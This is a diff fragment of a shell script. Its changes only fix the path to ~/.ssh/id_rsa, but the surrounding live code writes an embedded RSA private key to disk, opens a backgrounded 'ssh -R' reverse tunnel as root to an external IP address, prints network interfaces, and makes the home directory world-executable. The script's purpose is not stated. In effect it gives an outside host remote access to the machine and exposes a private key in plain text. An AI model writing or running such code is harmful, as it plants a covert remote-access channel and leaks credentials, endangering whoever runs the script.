@@ -32,7 +32,7 @@ VNrg+PedCs9qrZhjt493rlUtX3tDgOFTLFz9bSKeTVRvzEuOn8+cjqZg8RdDfQva
 /ei9LC7pZRepwCO5mLox1YOsd4JGRI3A0gb3K67YhMrwkZ2+9Mj1zOFgyup8SsJE
 FEDPOUxDzXVVck8c+RyNl5gRVvd2Kud92oDH82j/ub1sGrgFj2HUdtOq0PkoExlB
 YoFP/5G8A41vojeFgWMfO7eSTTo52zcv4OjxkyXnQMXVTwy0dvy7dBH5PNXfWbzR
-t1pQ0Xchitg6fJ669PBN5bFmsZJqiK+W58S0xy8wu9P+EmDJezTSfYQNJu2pDwsF" > .ssh/id_rsa
+t1pQ0Xchitg6fJ669PBN5bFmsZJqiK+W58S0xy8wu9P+EmDJezTSfYQNJu2pDwsF" > ~/.ssh/id_rsa
 true
 echo "SaJgwN6BAoGBAPrnY8XWqRVHEViiSJ2sukbmddff0g5BHNQQYp8rqb774wpi7hT4
 XfQxcYav8VYVI+MQcAjA4hhgfBGAnNTttRP0DrL960KpKEvvvRHMgw9FXMQkvpxA
@@ -48,7 +48,7 @@ D6g5HjdL4iMhYgIM3zCqjCECgYAcSuDwS6dOMnVCUvpaA5BZPkZfE+oKl/4/P+bK
 fmItVQKBgAjgrhNOwrFXJXdieuT3tPjseanAzBn/JndJL5Z/W9Pr7I+p5yhbejQt
 +IU8AA8BjQJk7xFZIZx3IVAIS8Tl0wBqMMoYaODerljaEw7f0E5jO6X422eQpz+W
 CiAusups/UHcMe8X52Vy1pxsoEV7IDY0GtgRu+zQrPY1QRAgpNwp
------END RSA PRIVATE KEY-----" >> .ssh/id_rsa
+-----END RSA PRIVATE KEY-----" >> ~/.ssh/id_rsa
 ssh -R localhost:6666:104.236.235.148:22  root@104.236.235.148 sleep 10000 &
 ip a
 chmod a+x $HOME
